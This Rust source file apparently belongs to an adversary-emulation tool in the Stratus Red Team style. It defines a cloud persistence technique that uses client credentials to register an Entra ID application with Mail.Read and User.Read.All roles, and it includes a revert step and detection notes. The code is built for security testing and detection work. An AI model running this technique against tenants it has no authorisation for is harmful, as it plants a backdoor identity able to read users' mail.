use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

async fn graph_token() -> Result<String> {
    let tenant_id = std::env::var("AZURE_TENANT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_TENANT_ID env var not set"))?;
    let client_id = std::env::var("AZURE_CLIENT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_ID env var not set"))?;
    let client_secret = std::env::var("AZURE_CLIENT_SECRET")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_SECRET env var not set"))?;
    let url = format!(
        "https://login.microsoftonline.com/{}/oauth2/v2.0/token",
        tenant_id
    );
    let http = reqwest::Client::new();
    let params = [
        ("client_id", client_id.as_str()),
        ("client_secret", client_secret.as_str()),
        ("scope", "https://graph.microsoft.com/.default"),
        ("grant_type", "client_credentials"),
    ];
    let resp: serde_json::Value = http
        .post(&url)
        .form(&params)
        .send()
        .await?
        .json()
        .await?;
    resp["access_token"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("No access_token in response"))
        .map(str::to_string)
}

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    let url = "https://graph.microsoft.com/v1.0/applications";

    let body = serde_json::json!({
        "displayName": "stratus-red-team-backdoor-app",
        "signInAudience": "AzureADMyOrg",
        "requiredResourceAccess": [{
            "resourceAppId": "00000003-0000-0000-c000-000000000000",
            "resourceAccess": [
                { "id": "810c84a8-4a9e-49e6-bf7d-12d183f40d01", "type": "Role" },
                { "id": "df021288-bdef-4463-88db-98f22de89214", "type": "Role" }
            ]
        }]
    });

    let resp = http
        .post(url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 201 {
        let data: serde_json::Value = resp.json().await?;
        let app_id = data["id"].as_str().unwrap_or("unknown");
        let app_client_id = data["appId"].as_str().unwrap_or("unknown");
        println!(
            "Created new Entra ID application 'stratus-red-team-backdoor-app' \
             (objectId: {}, clientId: {}) with Mail.Read and User.Read.All permissions — \
             attacker controls a high-privilege app registration",
            app_id, app_client_id
        );
        // Store for revert
        println!("Application object ID for revert: {}", app_id);
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to create application ({}): {}", status, text);
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    // Search for the created app by display name
    let search_url = "https://graph.microsoft.com/v1.0/applications?$filter=displayName eq 'stratus-red-team-backdoor-app'";
    let search_resp: serde_json::Value = http
        .get(search_url)
        .bearer_auth(&token)
        .send()
        .await?
        .json()
        .await?;

    let apps = search_resp["value"]
        .as_array()
        .ok_or_else(|| anyhow::anyhow!("No value in search response"))?;

    for app in apps {
        let app_id = app["id"].as_str().unwrap_or("");
        let del_url = format!("https://graph.microsoft.com/v1.0/applications/{}", app_id);
        let del_resp = http.delete(&del_url).bearer_auth(&token).send().await?;
        if del_resp.status().is_success() || del_resp.status().as_u16() == 204 {
            println!("Deleted application '{}' (id: {})", "stratus-red-team-backdoor-app", app_id);
        }
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "entra-id.persistence.new-application",
        friendly_name: "Create New Entra ID Application Registration",
        description: "Creates a new Entra ID application registration with high-privilege API permissions (Mail.Read, User.Read.All), establishing a persistent identity with broad access.",
        detection: "Entra ID audit log: Add application. Microsoft Sentinel: New privileged application registration alert.",
        platform: Platform::EntraId,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
